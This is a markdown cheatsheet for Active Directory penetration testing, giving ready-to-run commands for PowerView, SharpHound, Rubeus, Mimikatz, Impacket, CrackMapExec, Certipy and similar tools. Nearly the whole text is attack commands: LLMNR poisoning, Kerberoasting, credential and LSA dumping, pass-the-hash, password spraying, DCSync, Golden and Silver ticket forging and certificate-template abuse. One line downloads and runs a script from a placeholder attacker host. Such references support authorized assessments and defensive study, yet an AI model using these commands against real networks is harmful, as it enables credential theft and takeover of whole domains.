# Active Directory Security Tools Cheatsheet 🛡️

This cheatsheet provides a quick reference for essential tools used in Active Directory security assessments and penetration testing.

---

## ## 1. Enumeration & Situational Awareness

Tools for mapping the AD environment, finding users, computers, groups, and identifying attack paths.

### ### PowerView
* **Purpose:** A PowerShell tool for gaining network situational awareness on Windows domains. It's the go-to for manual AD enumeration.
* **Availability:** Part of the PowerSploit framework on GitHub. (https://github.com/PowerShellMafia/PowerSploit)
* **Common Commands:**
    ```powershell
    # Get information about the current domain
    Get-NetDomain

    # Find all users with a description containing "admin"
    Get-NetUser -Opsec | Where-Object {$_.description -like "*admin*"}

    # Get members of the "Domain Admins" group
    Get-NetGroupMember -GroupName "Domain Admins"

    # Find computers running a server OS
    Get-NetComputer -OperatingSystem "*Server*"

    # Find users vulnerable to Kerberoasting (with SPNs set)
    Get-NetUser -SPN
    ```

### ### BloodHound & SharpHound
* **Purpose:** The single most important tool for visualizing AD attack paths. `SharpHound` is the data collector (ingestor), and `BloodHound` is the GUI for analysis.
* **Availability:** GitHub project. (https://github.com/BloodHoundAD/BloodHound)
* **Common Commands (SharpHound):**
    ```powershell
    # Collect all available data from the domain and create a ZIP file
    SharpHound.exe --collectionmethod All --zipfilename loot.zip

    # Run the collector from memory using PowerShell
    IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/SharpHound.ps1');
    Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
    ```

### ### AdFind
* **Purpose:** A command-line tool for querying Active Directory. It's extremely fast and powerful for targeted LDAP queries.
* **Availability:** Free tool from Joeware. (http://www.joeware.net/freetools/tools/adfind/)
* **Common Commands:**
    ```powershell
    # Find all GPOs in the domain
    AdFind.exe -f "(objectClass=groupPolicyContainer)"

    # Find all users with Service Principal Names (Kerberoastable)
    AdFind.exe -f "(&(samAccountType=805306368)(servicePrincipalName=*))" -dn sAMAccountName servicePrincipalName

    # Find users with 'admin' in their name
    AdFind.exe -f "(&(objectClass=user)(samaccountname=*admin*))"
    ```

---

## ## 2. Credential Attacks & Hash Grabbing

Tools for acquiring password hashes through network-level attacks.

### ### Responder
* **Purpose:** Captures NTLMv2 hashes by poisoning LLMNR and NBT-NS name resolution requests.
* **Availability:** Built into Kali Linux. (https://github.com/lgandx/Responder)
* **Common Commands:**
    ```bash
    # Run Responder on your network interface to start listening and poisoning
    sudo responder -I eth0 -v
    ```

### ### Rubeus
* **Purpose:** A C# toolset for raw Kerberos interaction. It's the primary tool for **Kerberoasting** and **AS-REP Roasting**.
* **Availability:** GitHub project. (https://github.com/GhostPack/Rubeus)
* **Common Commands:**
    ```powershell
    # Perform a Kerberoast attack, requesting tickets for all SPNs
    Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

    # Perform an AS-REP roast for users without pre-authentication
    Rubeus.exe asreproast /outfile:asrep_hashes.txt
    ```

---

## ## 3. Exploitation, Lateral Movement & Privilege Escalation

Tools for using credentials to move around the network and escalate privileges.

### ### Mimikatz
* **Purpose:** The quintessential Windows credential dumping tool. Used to extract plaintext passwords, hashes, and Kerberos tickets from memory. **Requires local admin rights.**
* **Availability:** GitHub project. (https://github.com/gentilkiwi/mimikatz)
* **Common Commands:**
    ```powershell
    # Get debug privileges (required for many commands)
    privilege::debug

    # Dump all available credentials from the LSA process
    sekurlsa::logonpasswords

    # Perform a Pass-the-Ticket attack by injecting a stolen .kirbi ticket
    kerberos::ptt /path/to/ticket.kirbi
    ```

### ### Impacket Suite
* **Purpose:** A collection of Python scripts for working with network protocols. Essential for interacting with Windows machines from a Linux attacker host.
* **Availability:** Python library on GitHub. (https://github.com/fortra/impacket)
* **Common Commands:**
    ```bash
    # Get a semi-interactive shell using a password or hash (Pass-the-Hash)
    impacket-psexec <DOMAIN>/<USER>@<TARGET_IP>
    impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes <LM_HASH>:<NT_HASH>

    # Dump all hashes from a remote machine's SAM/LSA
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

    # Perform a Kerberoast attack from Linux
    impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>
    ```

### ### CrackMapExec (CME)
* **Purpose:** A multi-functional tool for automating assessment of large AD networks. Used for password spraying, command execution, and situational awareness.
* **Availability:** Built into Kali Linux. (https://github.com/byt3bl33d3r/CrackMapExec)
* **Common Commands:**
    ```bash
    # Check which accounts a password works for on a subnet
    cme smb 192.168.1.0/24 -u users.txt -p 'Password123!'

    # Execute a command on all systems where you have admin access
    cme smb 192.168.1.0/24 -u Administrator -H <NT_HASH> -x "whoami"

    # Dump LSA secrets from all accessible hosts
    cme smb 192.168.1.0/24 -u <USER> -p <PASSWORD> --lsa
    ```

### ### Certipy
* **Purpose:** The primary tool for finding and exploiting vulnerabilities in Active Directory Certificate Services (AD CS).
* **Availability:** Python tool on GitHub. (https://github.com/ly4k/Certipy)
* **Common Commands:**
    ```bash
    # Find vulnerable certificate templates on the domain
    certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable

    # Request a certificate based on a vulnerable template (e.g., ESC1)
    certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE_NAME> -target <TARGET_SERVER>

    # Use the generated certificate to authenticate and get a hash (NTLM)
    certipy auth -pfx <CERTIFICATE.pfx> -dc-ip <DC_IP>
    ```

---

## ## 4. Domain Dominance & Persistence

Tools for achieving and maintaining control over the entire domain.

### ### Mimikatz (for Domain Dominance)
* **Purpose:** Used to perform **DCSync** attacks and create **Golden/Silver Tickets**.
* **Availability:** GitHub project.
* **Common Commands:**
    ```powershell
    # Perform a DCSync attack to get the password hash of the krbtgt account
    lsadump::dcsync /domain:corp.local /user:krbtgt

    # Forge a Golden Ticket to impersonate any user (e.g., Administrator)
    kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

    # Forge a Silver Ticket for a specific service (e.g., CIFS on a DC)
    kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN_SID> /target:dc01.corp.local /service:cifs /rc4:<MACHINE_ACCOUNT_HASH> /ptt
    ```
